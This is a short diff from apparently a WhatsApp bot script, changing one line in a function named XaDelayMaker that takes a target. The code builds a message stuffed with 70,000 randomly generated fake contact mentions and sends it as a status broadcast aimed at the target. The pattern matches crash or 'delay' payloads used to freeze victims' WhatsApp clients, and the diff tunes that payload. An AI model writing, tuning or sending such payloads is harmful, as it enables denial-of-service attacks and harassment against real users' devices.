@@ -18,7 +18,7 @@ async function XaDelayMaker(target, conn) {
           singleSelectReply: { selectedRowId: "🔴" },
           contextInfo: {
             mentionedJid: Array.from({ length: 70000 }, () =>
-              "1" + Math.floor(Math.random() * 700000) + "@s.whatsapp.net"
+              "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
             ),
             participant: target,
             remoteJid: "status@broadcast",
